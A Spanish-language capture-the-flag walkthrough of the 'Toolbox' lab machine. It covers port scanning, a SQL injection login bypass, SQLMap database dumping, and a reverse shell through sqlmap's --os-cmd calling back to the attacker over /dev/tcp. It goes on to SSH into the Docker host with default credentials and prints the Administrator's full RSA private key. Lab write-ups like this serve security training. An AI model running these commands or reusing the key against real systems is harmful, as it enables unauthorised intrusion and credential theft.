---------------
- Tags: #windows #postgreSQL #SQLMap #rce #docker #toolbox_explotation

![Pasted image 20240910232703.png](/assets/images/ToolBox/Pastedimage20240910232703.png)

-----------------
# RECONOCIMIENTO


> Empezamos lanzando el siguiente comando para ver el `SO` de la maquina segun el `TTL` de la maquina

```bash
❯ ping -c 1 10.10.10.236
PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data.
64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=42.4 ms

--- 10.10.10.236 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.423/42.423/42.423/0.000 ms
```

- Por el `TTL` vemos que nuestra maquina es `Windows` por lo que sabiendo esto vamos a avanzar al siguiente paso

>Reconocimiento de puertos abiertos dentro de nuestra maquina

```bash
❯ nmap -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV -oA scans/nmap-tcpscripts 10.10.10.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:46 UTC
Nmap scan report for 10.10.10.236
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_http-title: MegaLogistics
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-09T19:48:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.82 seconds
```

**He probado de varias formas a la hora de hacer la maquina y de esta forma es la que me reporta mas información**

>Yendo por partes, como observamos de primeras vemos un puerto 21 de `ftp` abierto con usuario `anonymous` habilitado, por lo que vamos a echarle un vistazo

```bash
❯ ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:user): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54534|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> 
```

- Nos reporta información de un archivo `docker-toolbox.exe` , por lo que podemos intuir que nos estamos enfrentando a una maquina que este utilizando este sistema de contenedores dentro del propio Windows.
- Sobre el puerto `SSH` abierto no podemos hacer nada debido a que no tenemos credenciales ni nada por el estilo de momento.
- Los siguiente puertos interesantes que estoy viendo son los del servicio `https` que es el `443` y el servicio `SMB` que tienen corriendo, por lo que vamos a echarle un vistazo primero al servicio `SMB` y luego tiramos por el `HTTPS`

>Listamos los recursos compartidos del servicio `SMB` con el uso de una `NULL SESSION`

```bash
root@f731424b55d8:/# smbclient -L 10.10.10.236 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

- Pero no nos reporta nada, podríamos probar mas cosas contra este servicio pero no es el caso.

>Como vemos tenemos un servicio `HTTPS` corriendo, con la información que nos reporta el escaneo exhaustivo podemos ver algunas cosas de gran utilidad como el nombre de dominio `admin.megalogistic.com` y el nombre de dominio `megalogistic.com`, por lo que vamos a entrar a ver que información nos reporta.

```bash
echo "nombres_dominio" >> /etc/hosts
```

- Dominio `megalogistic.com`

![Pasted image 20240909234156.png](/assets/images/ToolBox/Pastedimage20240909234156.png)

- Dominio `admin.megalogistic.com`

![Pasted image 20240909234317.png](/assets/images/ToolBox/Pastedimage20240909234317.png)

- La pagina que mas nos interesa es la del acceso al `Login`, por lo que vamos a intentar `bypassear` el panel.
- **En el caso que no sepamos los nombre de dominios de las paginas, por el casual de que nuestro escaneo no ha salido reflejado, podéis ver la información del certificado `SSL` de la web que os va a dar información como la siguiente**

![Pasted image 20240909234614.png](/assets/images/ToolBox/Pastedimage20240909234614.png)

-----------------
# LOGIN BYPASS

>Vamos a probar a hacer una Inyección SQL básica

![Pasted image 20240909234736.png](/assets/images/ToolBox/Pastedimage20240909234736.png)

**!FUNCIONA!**

![Pasted image 20240909234826.png](/assets/images/ToolBox/Pastedimage20240909234826.png)

- Por lo que sabemos que el campo username es vulnerable a `SQLINJECTION`

---------------
# SQLMAP INJECTIONS

>Vamos a capturar la petición del panel de `Login` con `BurpSuite` para poder utilizar la herramienta `SQLMap` e intentar extraer información de la Base de Datos.

![Pasted image 20240909235320.png](/assets/images/ToolBox/Pastedimage20240909235320.png)

>Comandos de `SQLMap`

- Comando para `dumpear` el nombre de las Bases de Datos del sistema

```bash
❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

- Miramos las tablas dentro de la Base de Datos `public`

```bash
❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public --tables

Database: public
[1 table]
+-------+
| users |
+-------+
```

- Miramos las columnas que tiene la tabla `users`

```bash
❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public T users --columns

Database: public
Table: users
[2 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| password | varchar |
| username | varchar |
+----------+---------+
```

- Dumpeamos los valores de dichas columnas

```bash
❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public -T users -C password,username --dump

Database: public
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
```

- Intentamos crackear el `hash` pero tampoco van por ahí los tiros por lo que vamos a intentar si a través de `SQLMap` nos podemos entablar una `reverse-shell`
Nos ponemos en escucha por el puerto `443` en nuestra maquina

```bash
nc -nlvp 443
```

- Y ejecutamos el siguiente comando con `SQLMap`

```bash
❯ sqlmap -r request.txt -p username --batch --force-ssl --os-cmd 'bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"'
```

- Ganamos acceso al sistema

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.236 50701
bash: cannot set terminal process group (2359): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
```

---------------
# TRATAMIENTO DE LA TTY

```bash
script /dev/null -c bash

CTRL + Z 

stty raw -echo;fg

reset xterm

export TERM=xterm

export SHELL=bash

stty rows 38 columns 183
```

---------------------
# ESCALADA DE PRIVILEGIOS

>Capturamos la `flag user`

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt 
f0183e4437**********  flag.txt
```

- Como podemos intuir estamos dentro de un contenedor de `Docker` que lo mas probable este corriendo `docker-toolbox` por debajo, las credenciales por defecto de este son `docker` y `tcuser` por lo que vamos a probar a conectarnos de la siguiente forma.

>Comprobamos que estamos dentro de un contenedor

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/.ssh$ hostname -I
172.17.0.2
```

- Comprobamos que `ssh` esta instalado dentro del container
```bash
postgres@bc56e3cc55e9:/var/lib/postgresql/.ssh$ which ssh
/usr/bin/ssh
```

>Probamos conectarnos a la dirección `172.17.0.1` a través de `ssh` para acceder a la maquina real.

```bash
postgres@bc56e3cc55e9:/var/lib/postgresql$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$
```

- Como vemos hemos ganado acceso al sistema

```bash
docker@box:~$ ip a                                                                                                                                                                    
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:f2:5e:be brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fef2:5ebe/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:2c:6d:87 brd ff:ff:ff:ff:ff:ff
    inet 192.168.99.100/24 brd 192.168.99.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe2c:6d87/64 scope link 
       valid_lft forever preferred_lft forever
4: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
5: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:b3:df:23:2f brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:b3ff:fedf:232f/64 scope link 
       valid_lft forever preferred_lft forever
7: veth0acbe65@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 7a:3d:49:d0:05:44 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::783d:49ff:fed0:544/64 scope link 
       valid_lft forever preferred_lft forever
```


-----------------
# GANAR EL ROOT

>Empezamos reconociendo el sistema y vemos lo siguiente

```bash
root@box:/c/Users/Administrator/.ssh# cat /etc/os-release                                                                                                                             
NAME=Boot2Docker
VERSION=19.03.5
ID=boot2docker
ID_LIKE=tcl
VERSION_ID=19.03.5
PRETTY_NAME="Boot2Docker 19.03.5 (TCL 10.1)"
ANSI_COLOR="1;34"
HOME_URL="https://github.com/boot2docker/boot2docker"
SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"
```

- El sistema esta corriendo dentro de una maquina virtual que corre un sistema operativo llamado Boot2Docker, por lo que ahora tenemos que escapar de esta maquina virtual y poder escalar a la maquina Windows

>Haciendo `sudo -l` nos reporta lo siguiente

```bash
docker@box:~$ sudo -l                                                                                                                                                                 
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL
docker@box:~$ sudo su                                                                                                                                                                 
root@box:/home/docker# cd /
root@box:/# ls -la                                                                                                                                                                    
total 244
drwxr-xr-x   17 root     root           440 Sep 10 16:50 .
drwxr-xr-x   17 root     root           440 Sep 10 16:50 ..
drwxr-xr-x    2 root     root          1420 Sep 10 16:48 bin
drwxr-xr-x    3 root     root            60 Sep 10 16:50 c
drwxrwxr-x   14 root     staff         4340 Sep 10 16:48 dev
drwxr-xr-x    9 root     root          1000 Sep 10 16:51 etc
drwxrwxr-x    4 root     staff           80 Sep 10 16:48 home
-rwxr-xr-x    1 root     root           496 Oct 19  2019 init
drwxr-xr-x    4 root     root           800 Sep 10 16:48 lib
lrwxrwxrwx    1 root     root             3 Sep 10 16:48 lib64 -> lib
lrwxrwxrwx    1 root     root            11 Sep 10 16:48 linuxrc -> bin/busybox
drwxr-xr-x    4 root     root            80 Sep 10 16:48 mnt
drwxrwsr-x    3 root     staff          180 Sep 10 16:51 opt
dr-xr-xr-x  162 root     root             0 Sep 10 16:47 proc
drwxrwxr-x    2 root     staff           80 Sep 10 16:48 root
drwxrwxr-x    6 root     staff          140 Sep 10 16:51 run
drwxr-xr-x    2 root     root          1300 Sep 10 16:48 sbin
-rw-r--r--    1 root     root        241842 Oct 19  2019 squashfs.tgz
dr-xr-xr-x   13 root     root             0 Sep 10 16:48 sys
lrwxrwxrwx    1 root     root            13 Sep 10 16:48 tmp -> /mnt/sda1/tmp
drwxr-xr-x    7 root     root           140 Sep 10 16:48 usr
drwxrwxr-x    8 root     staff          180 Sep 10 16:48 var
```

- Algo que nos llama la atención es el directorio que se llama `c`, por lo que entremos a echar un vistazo

```bash
root@box:/# cd c/                                                                                                                                                                     
root@box:/c# ls                                                                                                                                                                       
Users
root@box:/c# cd Users/                                                                                                                                                                
root@box:/c/Users# ls                                                                                                                                                                 
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
root@box:/c/Users# cd Administrator/ 
root@box:/c/Users/Administrator# ls -la                                                                                                                                               
total 1465
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 .
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 ..
drwxrwxrwx    1 docker   staff         4096 Sep 10 16:47 .VirtualBox
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 .docker
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 .ssh
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 3D Objects
drwxrwxrwx    1 docker   staff            0 Feb 18  2020 AppData
drwxrwxrwx    1 docker   staff            0 Feb 19  2020 Application Data
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Contacts
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Cookies
dr-xr-xr-x    1 docker   staff            0 Feb  8  2021 Desktop
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Documents
dr-xr-xr-x    1 docker   staff            0 Apr  5  2021 Downloads
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Favorites
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Links
drwxrwxrwx    1 docker   staff         4096 Feb 18  2020 Local Settings
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Music
dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 My Documents
-rwxrwxrwx    1 docker   staff       262144 Jan 11  2022 NTUSER.DAT
-rwxrwxrwx    1 docker   staff        65536 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TM.blf
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx    1 docker   staff       524288 Feb 18  2020 NTUSER.DAT{1651d10a-52b3-11ea-b3e9-000c29d8029c}.TMContainer00000000000000000002.regtrans-ms
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 NetHood
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Pictures
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Recent
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Saved Games
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Searches
dr-xr-xr-x    1 docker   staff            0 Sep 15  2018 SendTo
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Start Menu
drwxrwxrwx    1 docker   staff            0 Sep 15  2018 Templates
dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Videos
-rwxrwxrwx    1 docker   staff        12288 Feb 18  2020 ntuser.dat.LOG1
-rwxrwxrwx    1 docker   staff        81920 Feb 18  2020 ntuser.dat.LOG2
-rwxrwxrwx    1 docker   staff           20 Feb 18  2020 ntuser.ini
```

>Como vemos parece que hay como una especie de montura o duplicado del disco `c` de la maquina `Windows ` dentro del sistema, como vemos hay un directorio `.ssh` que puede que tenga `id_rsa` valida para la conexión

```bash
root@box:/c/Users/Administrator# cd .ssh/                                                                                                                                             
root@box:/c/Users/Administrator/.ssh# ls -la                                                                                                                                          
total 18
drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 authorized_keys
-rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
-rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts
root@box:/c/Users/Administrator/.ssh# cat id_rsa                                                                                                                                      
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
```

**Y aquí lo tenemos, una `id_rsa` por lo que lo ultimo que queda seria probarla y ver a donde nos conecta**

```bash
ssh -i id_rsa Administrator@10.10.10.236
Microsoft Windows [Version 10.0.17763.1039]
(c) 2018 Microsoft Corporation. All rights reserved. 

administrator@TOOLBOX C:\Users\Administrator>dir     
 Volume in drive C has no label.
 Volume Serial Number is 64F8-B588

 Directory of C:\Users\Administrator

02/08/2021  11:38 AM    <DIR>          .
02/08/2021  11:38 AM    <DIR>          ..
02/18/2020  05:34 PM    <DIR>          .docker     
02/19/2020  06:49 PM    <DIR>          .ssh        
09/10/2024  10:17 PM    <DIR>          .VirtualBox 
02/18/2020  06:56 PM    <DIR>          3D Objects  
02/18/2020  06:56 PM    <DIR>          Contacts    
02/08/2021  11:39 AM    <DIR>          Desktop     
02/19/2020  05:29 PM    <DIR>          Documents   
04/06/2021  03:55 AM    <DIR>          Downloads   
02/18/2020  06:56 PM    <DIR>          Favorites   
02/18/2020  06:56 PM    <DIR>          Links       
02/18/2020  06:56 PM    <DIR>          Music       
02/18/2020  06:56 PM    <DIR>          Pictures    
02/18/2020  06:56 PM    <DIR>          Saved Games 
02/18/2020  06:56 PM    <DIR>          Searches    
02/18/2020  06:56 PM    <DIR>          Videos      
               0 File(s)              0 bytes      
              17 Dir(s)   5,506,625,536 bytes free 

administrator@TOOLBOX C:\Users\Administrator>cd Desktop 

administrator@TOOLBOX C:\Users\Administrator\Desktop>type root.txt 
cc9a0b76ac17f************

administrator@TOOLBOX C:\Users\Administrator\Desktop>
```

**Y ya lo tendríamos todo!**
